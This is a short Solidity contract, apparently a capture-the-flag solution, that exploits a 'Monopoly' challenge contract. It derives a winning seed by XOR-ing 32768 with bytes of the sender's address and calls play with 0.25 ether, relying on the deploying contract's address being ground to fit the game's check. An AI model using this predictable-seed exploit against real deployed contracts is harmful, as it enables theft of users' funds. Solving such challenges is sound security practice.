pragma solidity 0.8.7;
import "./Monopoly.sol";

contract Solve {
    constructor(Monopoly ins) payable {
        address ori = msg.sender;
        uint32 _seed2 = uint32(32768 ^ uint16(bytes2(bytes20(address(ori)))));
        // address(this)'s first two bytes ^ 7 == 2**15
        // _seed2 ^ tx.origin's first two bytes == 2**15
        ins.play{value: 0.25 ether}(7, _seed2);
    }
}
